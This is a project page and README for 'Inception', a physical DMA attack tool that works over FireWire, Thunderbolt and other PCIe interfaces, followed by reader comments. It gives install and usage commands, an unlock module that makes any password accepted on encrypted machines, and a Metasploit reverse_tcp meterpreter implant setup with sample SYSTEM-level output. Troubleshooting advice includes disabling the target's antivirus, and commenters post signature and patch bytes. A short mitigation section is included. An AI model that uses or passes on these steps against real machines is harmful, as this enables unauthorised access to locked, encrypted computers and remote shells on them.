<article class="post-537 page type-page status-publish has-post-thumbnail hentry clearfix" id="post-537" itemscope="" itemtype="http://schema.org/BlogPosting" role="article">
<header>
<div class="page-header"><h1 class="page-title" itemprop="headline">Inception</h1></div>
</header> <!-- end article header -->
<section class="post_content clearfix" itemprop="articleBody">
<p class="lead"><a href="http://www.breaknenter.org/wp-content/uploads/2011/09/inception_movie_poster_small.png" onclick="_gaq.push(['_trackEvent', 'outbound-article-int', 'http://www.breaknenter.org/wp-content/uploads/2011/09/inception_movie_poster_small.png', '']);"><img alt="" class="aligncenter size-full wp-image-966" src="http://www.breaknenter.org/wp-content/uploads/2011/09/inception_movie_poster_small.png" title="Inception"/></a><div class="toc toc">

<div class="toc-end"> </div>
<p>Inception is a physical memory manipulation and hacking tool exploiting PCI-based DMA. The tool can attack over FireWire, Thunderbolt, ExpressCard, PC Card and any other PCI/PCIe interfaces.</p>
<p>Inception aims to provide a relatively quick, stable and easy way of performing intrusive and non-intrusive memory hacks against live computers using DMA.</p>
<a class="mwm-aal-item" name="how-it-works"></a><span id="How_it_works"><h3><a class="anchor" href="https://github.com/carmaa/inception#how-it-works" name="user-content-how-it-works" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#how-it-works', '']);" style="color: #4183c4;"></a>How it works</h3></span>
<p>Inception’s modules work as follows: By presenting a Serial Bus Protocol 2 (SBP-2) unit directory to the victim machine over the IEEE1394 FireWire interface, the victim operating system thinks that a SBP-2 device has connected to the FireWire port. Since SBP-2 devices utilize Direct Memory Access (DMA) for fast, large bulk data transfers (e.g., FireWire hard drives and digital camcorders), the victim lowers its shields and enables DMA for the device. The tool now has full read/write access to the lower 4GB of RAM on the victim.</p>
<p>Once DMA is granted, the tool proceeds to search through available memory pages for signatures at certain offsets in the operating system’s code. Once found, the tool manipulates this code. For instance, in the unlock module, the tool short circuits the operating system’s password authentication module that is triggered if an incorrect password is entered.</p>
<p><em>After running that module you should be able to log into the victim machine using any password.</em></p>
<p>An analogy for this operation is planting an idea into the memory of the machine; the idea that every password is correct. In other words, the equivalent of a <a href="http://inception.davepedu.com/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://inception.davepedu.com/', 'memory inception']);" style="color: #4183c4;">memory inception</a>.</p>
<a class="mwm-aal-item" name="awesome-but-why"></a><span id="Awesome_But_why"><h3><a class="anchor" href="https://github.com/carmaa/inception#awesome-but-why" name="user-content-awesome-but-why" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#awesome-but-why', '']);" style="color: #4183c4;"></a>Awesome! But why?</h3></span>
<p>The world’s forensics experts, governments and three-letter acronym agencies are using <a href="https://wikileaks.org/spyfiles/files/0/293_GAMMA-201110-FinFireWire.pdf" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://wikileaks.org/spyfiles/files/0/293_GAMMA-201110-FinFireWire.pdf', 'similar tools']);" style="color: #4183c4;">similar tools</a> already, so why not? Inception is free, as in beer. A professional equivalent tool will set you back ~10 000 USD. Hack back!</p>
<a class="mwm-aal-item" name="key-data"></a><span id="Key_data"><h2>Key data</h2></span>
<ul class="task-list">
<li>Version: 0.4.0</li>
<li>License: GPL</li>
<li>Author: Carsten Maartmann-Moe (<a href="/cdn-cgi/l/email-protection#80e3e1f2f3f4e5eec0e3e1f2ede1e1aee3efed" onclick="_gaq.push(['_trackEvent','mailto','carsten@carmaa.com']);" style="color: #4183c4;"><span class="__cf_email__" data-cfemail="8feceefdfcfbeae1cfeceefde2eeeea1ece0e2">[email protected]</span></a>) AKA ntropy</li>
<li>Twitter: @breaknenter</li>
<li>Site: <a href="http://www.breaknenter.org/projects/inception" onclick="_gaq.push(['_trackEvent', 'outbound-article-int', 'http://www.breaknenter.org/projects/inception', 'http://www.breaknenter.org/projects/inception']);" style="color: #4183c4;">http://www.breaknenter.org/projects/inception</a></li>
<li>Download / source: <a href="https://github.com/carmaa/inception" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception', 'https://github.com/carmaa/inception']);" style="color: #4183c4;">https://github.com/carmaa/inception</a></li>
</ul>
<p>The tool makes use of the <code>libforensic1394</code> library courtesy of Freddie Witherden under a LGPL license.</p>
<a class="mwm-aal-item" name="requirements"></a><span id="Requirements"><h2>Requirements</h2></span>
<p>Inception requires:</p>
<ul class="task-list">
<li>Hardware:
<ul class="task-list">
<li>Attacker machine: Linux or Mac OS X (host / attacker machine) with a FireWire or Thunderbolt interface, or an ExpressCard/PCMCIA expansion port. Linux is currently recommended due to buggy firewire interfaces on OS X</li>
<li>Victim machine: A FireWire or Thunderbolt interface, or an ExpressCard/PCMCIA expansion port</li>
</ul>
</li>
<li>Software:
<ul class="task-list">
<li>Python 3</li>
<li>git</li>
<li>gcc (incl. g++)</li>
<li>cmake</li>
<li>pip (for automatic resolution of dependencies)</li>
<li><a href="http://freddie.witherden.org/tools/libforensic1394/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://freddie.witherden.org/tools/libforensic1394/', 'libforensic1394']);" style="color: #4183c4;">libforensic1394</a></li>
<li>msgpack</li>
</ul>
</li>
</ul>
<a class="mwm-aal-item" name="installation"></a><span id="Installation"><h2>Installation</h2></span>
<p>On Debian-based distributions the installation command lines can be summarized as:</p>
<pre>sudo apt-get install git cmake g++ python3 python3-pip
</pre>
<p>On OS X, you can install the tool requirements with <a href="http://mxcl.github.io/homebrew/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://mxcl.github.io/homebrew/', 'homebrew']);" style="color: #4183c4;">homebrew</a>:</p>
<pre>brew install git cmake python3
</pre>
<p>After installing the requirements, download and install libforensic1394:</p>
<pre>git clone git://git.freddie.witherden.org/forensic1394.git
cd forensic1394
cmake CMakeLists.txt
sudo make install
cd python
sudo python3 setup.py install
</pre>
<a class="mwm-aal-item" name="download-and-install-inception"></a><span id="Download_and_install_Inception"><h3><a class="anchor" href="https://github.com/carmaa/inception#download-and-install-inception" name="user-content-download-and-install-inception" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#download-and-install-inception', '']);" style="color: #4183c4;"></a>Download and install Inception</h3></span>
<pre>git clone git://github.com/carmaa/inception.git
cd inception
./setup.py install
</pre>
<p>The setup script should be able to install dependencies if you have <code>pip</code> installed.</p>
<a class="mwm-aal-item" name="general-usage"></a><span id="General_usage"><h2>General usage</h2></span>
<ol class="task-list">
<li>Connect the attacker machine (host) and the victim (target) with a FireWire cable</li>
<li>Run Inception</li>
</ol>
<p>Simply type:</p>
<pre>incept [module name]
</pre>
<p>For a more complete and up-to-date description, please run:</p>
<pre>incept -h
</pre>
<p>or see the <a href="http://www.breaknenter.org/projects/inception/" onclick="_gaq.push(['_trackEvent', 'outbound-article-int', 'http://www.breaknenter.org/projects/inception/', 'tool home page']);" style="color: #4183c4;">tool home page</a>.</p>
<a class="mwm-aal-item" name="modules"></a><span id="Modules"><h2>Modules</h2></span>
<p>As of version 0.4.0, Inception has been modularized. The current modules, and their functionality is described below.</p>
<p>For detailed options on usage, run:</p>
<pre>incept [module name] -h
</pre>
<p>Note: Mavericks since 10.8.2 on Ivy Bridge (&gt;= 2012 Macs) have enabled VT-D effectively blocking DMA requests and thwarting almost all modules. Look for <code>vtd[0] fault</code> entries in your log/console.</p>
<a class="mwm-aal-item" name="unlock"></a><span id="Unlock"><h3><a class="anchor" href="https://github.com/carmaa/inception#unlock" name="user-content-unlock" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#unlock', '']);" style="color: #4183c4;"></a>Unlock</h3></span>
<p>The <code>unlock</code> module can unlock (any password accepted) and escalate privileges to Administrator/root on almost* any powered on machine you have physical access to. module is primarily attended to do its magic against computers that utilize full disk encryption such as BitLocker, FileVault, TrueCrypt or Pointsec. There are plenty of other (and better) ways to hack a machine that doesn’t pack encryption.</p>
<p>The unlock module is stable on machines that has 4 GiB of main memory or less. If your the target has more then that, you need to be lucky in order to find the signatures mapped to a physical memory page frame that the tool can reach.</p>
<p>As of this version, it is able to unlock the following x86 and x64 operating systems:</p>

<p>(1): Mavericks since 10.8.2 on Ivy Bridge (&gt;= 2012 Macs) have enabled VT-D effectively blocking DMA requests and thwarting this attack. Look for <code>vtd[0] fault</code> entries in your log/console. (2): If FileVault 2 is enabled, the tool will only work when the operating system is unlocked as of OS X Lion. (2): Other Linux distributions that use PAM-based authentication may also work using the Ubuntu signatures.</p>
<p>The module also effectively enables escalation of privileges, for instance via the <code>runas</code> or <code>sudo -s</code>commands, respectively.</p>
<a class="mwm-aal-item" name="execution"></a><span id="Execution"><h4><a class="anchor" href="https://github.com/carmaa/inception#execution" name="user-content-execution" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#execution', '']);" style="color: #4183c4;"></a>Execution</h4></span>
<p>To unlock, simply type:</p>
<pre>incept unlock

<a class="mwm-aal-item" name="implant"></a><span id="Implant"><h3><a class="anchor" href="https://github.com/carmaa/inception#implant" name="user-content-implant" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#implant', '']);" style="color: #4183c4;"></a>Implant</h3></span>
<p>The <code>implant</code> module implants a (potentially memory-only) Metasploit payload directly to the volatile memory of the target machine. It integrates with MSF through the <code>msfrpcd</code> daemon that is included in all versions of Metasploit.</p>
<p>The current version only work as a proof-of-concept against Windows 7 SP1 x86. No other OSes, versions or architectures are supported, nor is there any guarantee that they will be supported in the future. If you want to change this, send me a wad of cash in unmarked dollar bills or a pull request.</p>
<a class="mwm-aal-item" name="execution"></a><span id="Execution_1"><h4><a class="anchor" href="https://github.com/carmaa/inception#execution-1" name="user-content-execution-1" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception#execution-1', '']);" style="color: #4183c4;"></a>Execution</h4></span>
<p>To use it, start <code>msfrpcd</code>:</p>
<pre>msfrpcd -P [password]
</pre>
<p>Then launch inception:</p>
<pre>incept implant --msfpw [password] --msfopts [options]
</pre>
<p>As an example, to create a reverse TCP meterpreter shell from the target machine to your attacking host, first start the <code>msfrpcd</code> dameon, and then launch a console listening for callbacks.</p>
<pre>msfrpcd -P password
msfconsole
</pre>
<p>In the console, we configure the receiving end of the payload. We’re setting the <code>EXITFUNC</code> option to<code>thread</code> to ensure that the target process stays alive if something should go awry:</p>
<pre>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.16.1.1
set EXITFUNC thread
set ExitOnSession false
exploit -j
</pre>
<p>Then, in another terminal, we launch Inception:</p>
<pre>incept implant --msfpw password --msfopts LHOST=172.16.1.1

 _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
 _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
 _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
 _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
 _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|

v.0.4.0 (C) Carsten Maartmann-Moe 2014
Download: http://breaknenter.org/projects/inception | Twitter: @breaknenter

[?] Will potentially write to file. OK? [y/N] y
[!] This module currently only work as a proof-of-concept against Windows 7 SP1
    x86. No other OSes, versions or architectures are supported, nor is there
    any guarantee that they will be supported in the future. If you want to
    change this, send me a wad of cash in unmarked dollar bills or a pull
    request on github.

Server username: NT AUTHORITY\SYSTEM</pre>
<a class="mwm-aal-item" name="troubleshooting"></a><span id="Troubleshooting"><h2>Troubleshooting</h2></span>
<p>Not working you say? Here’s a couple of hints:</p>
<ul>
<li>First, use the -v switch to visually confirm that the tool is able to read memory from the victim.</li>
<li>Make sure you actually are connected with a IEEE134 FireWire cable (FireWire to USB converters, etc. won’t work, but 4/6/9 pin FireWire adapters do). Doh.</li>
<li>“Nofirewire devices detected on the bus”
<ul>
<li>First, try running the tool again.</li>
<li>If you get this error message, try a different cable and/or using a couple of converters  (such as <a href="http://www.amazon.com/Firewire-6-pin-Female-4-pin-Adapter/dp/B0046DXEO6/ref=sr_1_4?ie=UTF8&amp;qid=1337699466&amp;sr=8-4" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.amazon.com/Firewire-6-pin-Female-4-pin-Adapter/dp/B0046DXEO6/ref=sr_1_4?ie=UTF8&amp;qid=1337699466&amp;sr=8-4', 'this']);">this</a> and <a href="http://www.amazon.com/IEEE-1394-FireWire-Adapter-4-pin-Female/dp/B0016SN89A/ref=sr_1_15?ie=UTF8&amp;qid=1337699514&amp;sr=8-15" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.amazon.com/IEEE-1394-FireWire-Adapter-4-pin-Female/dp/B0016SN89A/ref=sr_1_15?ie=UTF8&amp;qid=1337699514&amp;sr=8-15', 'this']);">this</a>) to convert from 6/9 pin FireWire connector to 4 pin and back again. 6/9 pin FireWire cables are capable of transferring power, and this may cause trouble for some FireWire chipsets. Some FireWire cables are also known to be “straight-through” (i.e., not “crossover”), an this is known to cause trouble.</li>
<li>Are you attacking from an OS that doesn’t support hot-plugging (such as BackTrack) using a ExpressCard/etc. on the host side? Re-boot the machine <em>with the expansion card plugged in </em>before running Inception.</li>
</ul>
</li>
<li>Are you sure you’re getting DMA? Sometimes the target machine uses an extended period of time (I’ve experienced time-spans up to around 30 secs on slow targets) installing the FireWire drivers and lowering the DMA shield; it is possible that you just didn’t wait long enough before attacking. Use the delay switch to increase the delay, and -v/–verbose to see if you actually read data. Also, looking in the Device Manager (assuming you are setting up a demo attacking Windows) may be helpful to see that a FireWire SBP2 device actually pops up when running the tool. Mind you, it is all right with a yellow exclamation mark by the device, the tool should work nevertheless.</li>
<li>Does your target use some form of endpoint protection? Some antivirus vendors specifically block FireWire DMA. Turn it off and see what happens.</li>
<li>Does your FireWire port work? Try connecting a FireWire disk and see if it is recognized. Check your BIOS setting to see that it is not disabled. Ensure that FireWire drivers are present and not removed from the system.</li>
<li>Are you getting data, but still can’t find the signature? Check the above and see the FAQ below. Also check the amount of RAM installed (FireWire max addressable memory space is 4 GiB). The code <em>may</em> lie above that threshold, in which case the unlock attack won’t work. This is especially true for Linux machines, where kernel code resides in high memory addresses.</li>
<li>Did Inception patch successfully, but you cannot log in? Try a non-blank password. Some OS authentication mechanisms check for blank passwords before passing control to the mechanism that Inception patches.</li>
<li>Try again. Sometimes the DMA shield fails to lower on the first try/tries.</li>
</ul>
<a class="mwm-aal-item" name="known-bugs"></a><span id="Known_bugs"><h2>Known bugs</h2></span>
<ul>
<li>Due to severe bugs in the Mac OS X FireWire stack IOKit, attacking from a Mac can cause a kernel panic at the target and/or host system if an error condition should occur. As of March 2012, attacking from Mac OS X is not recommended.</li>
</ul>
<div>
<a class="mwm-aal-item" name="-caveats"></a><span id="Caveats"><h2>*) Caveats</h2></span>
</div>
<ul>
<li>Inception may not work reliably against machines with more than 4 GiB RAM, as the signatures the tool look for may be loaded at a memory address &gt; <code>0xffffffff</code>. You may still be able to exploit the target by dumping as much memory as possible and, say, <a href="http://www.carmaa.com/site/Development.html" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.carmaa.com/site/Development.html', 'search for encryption keys']);" title="Interrogate">search for encryption keys</a>.</li>
<li>You may have trouble reading above 2 GiB on targets with more than 2 GiB RAM. This is due to the way the memory controller provisions physical addresses. Since there’s currently no way of detecting (over FireWire) how much physical memory the target has, the tool will continue to attempt to read memory up to the 4 GiB limit. You will see a noticeable slowdown in reading when the tool tries to read data from addresses that doesn’t map to hardware RAM.</li>
<li>OS X Lion <a href="http://www.frameloss.org/2011/09/18/firewire-attacks-against-mac-os-lion-filevault-2-encryption/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.frameloss.org/2011/09/18/firewire-attacks-against-mac-os-lion-filevault-2-encryption/', 'disables DMA when the user is logged out/screen is locked and FileVault is enabled']);">disables DMA when the user is logged out/screen is locked and FileVault is enabled</a>. Attacking will only work while the user is logged in, or if user switching is enabled. The user switching trick only works for  versions before 10.7.2, where the vulnerability is patched.</li>
<li>If you have a OF/EFI firmware password set on the target Mac OS X, FireWire DMA is off by default.</li>
</ul>
<a class="mwm-aal-item" name="attack-mitigation"></a><span id="Attack_mitigation"><h2>Attack mitigation</h2></span>
<div>
<p>To stay safe and protect against FireWire DMA attacks, here’s a couple of suggestions:</p>
<a class="mwm-aal-item" name="windows"></a><span id="Windows"><h3>Windows</h3></span>
<ul>
<li><a href="http://support.microsoft.com/kb/2516445" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://support.microsoft.com/kb/2516445', 'Block the SBP-2 driver']);">Block the SBP-2 driver</a></li>
<li>Remove FireWire drivers from your system if you don’t need to use FireWire</li>
</ul>
<a class="mwm-aal-item" name="os-x"></a><span id="OS_X"><h3>OS X</h3></span>
<ul>
<li>Don’t panic – if you are using FileVault2 and OS X Lion (10.7.2) and higher, the OS will automatically turn off DMA when locked – you’re still vulnerable to attacks when unlocked, though</li>
<li><a href="http://ilostmynotes.blogspot.com/2012/01/os-x-open-firmware-settings-use-nvram.html" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://ilostmynotes.blogspot.com/2012/01/os-x-open-firmware-settings-use-nvram.html', 'Set a firmware password']);">Set a firmware password</a></li>
</ul>
<a class="mwm-aal-item" name="linux"></a><span id="Linux"><h3>Linux</h3></span>
<ul>
<li><a href="http://www.hermann-uwe.de/blog/physical-memory-attacks-via-firewire-dma-part-1-overview-and-mitigation" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.hermann-uwe.de/blog/physical-memory-attacks-via-firewire-dma-part-1-overview-and-mitigation', 'Disable DMA or remove the 1394 drivers']);">Disable DMA or remove the 1394 drivers</a> (see the ‘Mitigation: Linux’ section)</li>
</ul>
<p>All of the above will impact FireWire in one way or the other. Unfortunately, this is a FireWire design problem, not an OS problem, and would have to be fixed in the SBP-2 protocol itself.</p>
</div>
<a class="mwm-aal-item" name="history"></a><span id="History"><h2>History</h2></span>
<p>Inception was originally coded as a GPL replacement for <a href="http://www.storm.net.nz/projects/16" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.storm.net.nz/projects/16', 'winlockpwn']);">winlockpwn</a>, the Windows FireWire unlock tool made available by Adam Bolieu aka Metlstorm. winlockpwn was quite stable against older Windows XP targets, but did not perform well against more modern operating system like Windows 7 (and it is not maintained anymore). As of Linux kernel 2.6.22 Linux Distros ships with the new ‘Juju’ FireWire stack, making winlockpwn obsolete. Alas, Inception was born.</p>
<p>DMA attacks has been known for many years, so this is nothing new (except for the fact that I will reverse engineer new signatures and update the tool’s functionality until the problem is fixed). However, vendors generally dismiss DMA attacks as a non-issue, which I hope that the awareness that this tool generates will change. Users deserve secure devices, even when attackers gain physical access.</p>
<a class="mwm-aal-item" name="faq"></a><span id="FAQ"><h2>FAQ</h2></span>
<div>
<ol>
<li><strong>Q:</strong> This tool is irrelevant, I can just boot the machine with [insert live CD OS here], dump the SAM and SECURITY hives and crack the passwords.<br/>
<em><em><em><strong>A: </strong>No, you can’t if the target is a full disk encrypted machine. See above. This tool is designed to unlock powered on machines that utilize secure, full disk encryption. It is also far stealthier than the above attack.<br/>
</em></em></em></li>
<li><strong>Q:</strong> Can’t I just use the <a href="http://blog.relentless-coding.org/2010/02/screen-unlock-meterpreter-script.html" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://blog.relentless-coding.org/2010/02/screen-unlock-meterpreter-script.html', 'screen_unlock.rb Metasploit script']);">screen_unlock.rb Metasploit script</a>?<br/>
<em><em><em><strong>A: </strong>Well you can, assuming that you already have a shell at the target machine. If you have that, you probably won’t need this tool.<br/>
</em></em></em></li>
<li><strong>Q:</strong> I use full disk encryption. Your tool is moot.<br/>
<em><strong>A:</strong> No, you’re missing the point: The tool is <strong>intended</strong> to be used against full disk encrypted machines. Se FAQ 1.<br/>
</em></li>
<li><strong>Q:</strong> This is FUD! I would never let anyone plug anything into my machine! I’m never more than an arm’s length from my computer. In fact, my machine is the only object I have a non-platonic relationship with, and I would never let my eyes off her. No one would go to the trouble of hacking a single machine anyway.<em><em><em><br/>
<em><em><em><strong>A: </strong>Good for you. The attack is dependent on physical access to a box in a powered on or standby state, so likely you’ll not be hacked. However, there are organizations out there that would go to utmost lengths to be able to access machines in seconds without leaving a trace. If you are not a target of these organizations, you’re likely never going to be hacked this way. However, if it is your job to be paranoid, you should know about this attack and make an informed decision to protect yourself.</em></em></em><br/>
</em></em></em></li>
<li><strong>Q:</strong> I’ve just glued/desoldered all my Firewire ports. Your move, mhuddafuckah.<em><em><em><em><em><em><em><em><em><br/>
<em><em><em><strong>A: </strong>Ahem. See the answer to FAQ 7.</em></em></em><br/>
</em></em></em></em></em></em></em></em></em></li>
<li><strong>Q:</strong> Wasn’t this fixed years ago? I remember hearing about this in the olden days (2004).<em><em><em><em><em><em><em><em><em><br/>
<em><em><em><strong>A: </strong>Sadly, no. And yes, the problem is old, but it is not entirely fixable with a driver update, a patch or a new OS version. The problem is in the Firewire specs. All OS vendors that want to include Firewire drivers that are OHCI compliant and works out of the box with SBP-2 devices are vulnerable in some degree.<br/>
</em></em></em></em></em></em></em></em></em></em></em></em></li>
<li><strong>Q:</strong> Isn’t FireWire a dying horse? Few laptops ship with FireWire ports these days, which makes Inception a useless tool.<br/>
<em><strong>A:</strong> You can use any interface that expands the PCIe bus, for example PCMCIA, ExpressCards, <em>the new <a href="http://www.breaknenter.org/2012/02/adventures-with-daisy-in-thunderbolt-dma-land-hacking-macs-through-the-thunderbolt-interface/" onclick="_gaq.push(['_trackEvent', 'outbound-article-int', 'http://www.breaknenter.org/2012/02/adventures-with-daisy-in-thunderbolt-dma-land-hacking-macs-through-the-thunderbolt-interface/', 'Thunderbolt interface']);" title="Adventures with Daisy in Thunderbolt-DMA-land: Hacking Macs through the Thunderbolt interface">Thunderbolt interface</a> </em>and</em> <em> perhaps SD/IO to hotplug a FireWire interface into the victim machine. The OS will install the necessary drivers on the fly, even when the machine is locked.<br/>
</em></li>
<li><strong>Q:</strong> Your tool isn’t working.<br/>
<em><strong>A:</strong> That’s not a question. Check the troubleshooting section above first, and when you have made sure that the error source isn’t between the chair and the keyboard, preferably <a href="https://github.com/carmaa/inception/issues" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://github.com/carmaa/inception/issues', 'open an issue at github']);">open an issue at github</a> describing the problem, including:</em></li>
</ol>
<ul>
<ul>
<li><em>Your host OS</em></li>
<li><em>The target OS (For Windows, the output of running winver.exe on the machine, format: major.minor.build, for Linux the output of uname -a and perhaps cat /etc/lsb-release)</em></li>
<li><em>The target CPU architecture (x86/x64, etc.)</em></li>
<li><em>Output of the tool</em></li>
<li><em>Memory size of target</em></li>
</ul>
</ul>
</div>

<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>Maybe. The smart card reader would have to communicate with the OS in some way, and that communication would necessarily result in pages being loaded into memory and executed. If the smart card reader needs it’s own authentication modules loaded, I could probably need to reverse engineer the driver to understand how to eliminate the checks that verifies your smart card. Unfortunately, I’m not currently in possession of a smart card reader.</p>
<p>If you have a reader available, try it out. The existing patching of msv1_0.dll may very well work against smart card authentication as well.</p>
<time datetime="2011-10-21"><a href="http://www.breaknenter.org/projects/inception/#comment-357">October 21st, 2011 </a></time>

<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/57080883f3f3a49534dbf86d6896a075?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>tekkenhead</h4>
<p>I had the same problem with windows xp sp2 so I changed the offset and signature to this:</p>
<p>signature=0x83F8107513B0018B<br/>
pageoffset=0x946<br/>
patch=0x83F8109090B0018B</p>
<p>I haven’t tried it out. But is should NOP the jump function as in the other OS’s listed. I also had to change the vista pageoffset to suit my needs as well to get it to work for me.</p>

<li class="comment even thread-odd thread-alt depth-1">
<article class="clearfix" id="comment-422">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/afed8d86c57590e0692aff6f02badc13?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>jan</h4>
<p>Using a thinkpad R500 on the attacking side. I bought 2 types of firewire card, one express card and one pcmcia card, since the laptops have both types of slots. I tried all combinations of configurations but none work. however, the type of card I have in the slot determines the data I get when we are out of memory range. For example, when it reads in the region about 3GB where there is no memory I either see all fffffff or 000000 depending on the card. Where there is memory, I see rapidly changing memory contents, so I think I have access to at least some memory.</p>
<p>I am going to dig up my old emachines laptop and put the pcmcia card in it to see what is up.</p>

<p>Use this URL structure to specify firewire as memory capture source: <a href="http://code.google.com/p/volatility/wiki/Vol20AddressSpacesFirewire" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'http://code.google.com/p/volatility/wiki/Vol20AddressSpacesFirewire', 'http://code.google.com/p/volatility/wiki/Vol20AddressSpacesFirewire']);" rel="nofollow">http://code.google.com/p/volatility/wiki/Vol20AddressSpacesFirewire</a></p>

<li class="comment byuser comment-author-carmaa bypostauthor odd alt depth-2">
<article class="clearfix" id="comment-496">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/3a82d747bccc9f8e236612b160073c4d?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4><a class="url" href="http://www.carmaa.com" rel="external nofollow">Carsten</a></h4>
<p>Unfortunately, Virtualbox doesn’t store the memory from snapshots in binary data files like VMware, but rather use a compressed (?) format. FTWA does currently not support this format. You can use the -f switch to search through VMware memory (.vmem) files located in your vm folder.</p>
<p>If you venture into dissecting the virtualbox format, drop me a note.</p>
<time datetime="2012-01-15"><a href="http://www.breaknenter.org/projects/inception/#comment-496">January 15th, 2012 </a></time>
<a aria-label="Reply to Carsten" class="comment-reply-link" href="/projects/inception/?replytocom=496#respond" onclick='return addComment.moveForm( "comment-496", "496", "respond", "537" )'>Reply</a> </div>
</div>

<article class="clearfix" id="comment-498">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/57080883f3f3a49534dbf86d6896a075?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>tekkenhead</h4>
<p>Thanks for the info, but I decided not to redo my images in vmware or try and convert them right now.</p>
<p>I have recently tried your ftwa.py version and it works great. But there is a problem I ran in too. I got a keyboardinput error with a patchoffset error when running it against a windows xp machine. I looked at your code and you didn’t have a ‘patchoffset': 0x00′ in the settings.py under the windows xp settings. I changed that and the program worked fine. I only mention that if someone runs into the same error. </p>
<p>I also deleted the 5 lines that that dealt with offset 0x927 and added offset 0x9B6 instead under the other offsets. I recently upgraded a old windows xp sp2 to sp3 and found a new offset as well. Here are my signatures for xp: offsets': [0x0126, 0x8aa, 0x862, 0x946, 0x09B6]. I know xp is old but trying to be through. </p>
<p>I tried your program under windows 7×86 and everything works great and same can be said under windows7x64 including sp1 but I didn’t have any antivirus running and it was a fresh install,  but completely updated. If you can also add signature offset 0x80F for vista that would be cool. I am currently working on vista trying to find all signatures. Thanks again.</p>

<li class="comment odd alt depth-3">
<article class="clearfix" id="comment-1549">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://0.gravatar.com/avatar/a715a6b9b83e99d032aab79409451fba?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>SS</h4>
<p>Found something interesting here:<br/>
<a href="https://astr0baby.wordpress.com/2011/09/20/unlocking-windows-7-sp1-locked-screen-remotely/" onclick="_gaq.push(['_trackEvent', 'outbound-comment', 'https://astr0baby.wordpress.com/2011/09/20/unlocking-windows-7-sp1-locked-screen-remotely/', 'https://astr0baby.wordpress.com/2011/09/20/unlocking-windows-7-sp1-locked-screen-remotely/']);" rel="nofollow">https://astr0baby.wordpress.com/2011/09/20/unlocking-windows-7-sp1-locked-screen-remotely/</a><br/>
“Remember that once the memory is patched and the the user who locked the screen is part of a domain you need to immediately revert the patching  by issuing the ” screen_unlock -r” command after you log into Win7 with ANY password, or the domain account will be locked after a while.”<br/>
I can confirm that the statement above is true, because after patching a Win7 x64 Enterprise laptop (part of domain) with Inception I was able to log in with a random password a few times to test, but after a while (perhaps a few hours) the domain account got locked.</p>
<time datetime="2012-06-2"><a href="http://www.breaknenter.org/projects/inception/#comment-1549">June 2nd, 2012 </a></time>

<article class="clearfix" id="comment-1162">
<div class="comment-author vcard row-fluid clearfix">
<div class="avatar span2">
<img alt="" class="avatar avatar-75 photo" height="75" src="http://1.gravatar.com/avatar/934d8ed36216b18caec9461823c1fe3b?s=75&amp;d=%3Cpath_to_url%3E&amp;r=G" width="75"/> </div>
<div class="span10 comment-text">
<h4>Will</h4>
<p>Wow, great tool! I finally got an Ubuntu LiveUSB working on my Mac (the EFI makes it really hard), and I was able to try it out. The memory dump worked great! I was surprised at the amount of human-readable text in the first few megs of RAM from a dump of a Mac. Quite a few funny random things strewn about in there!</p>
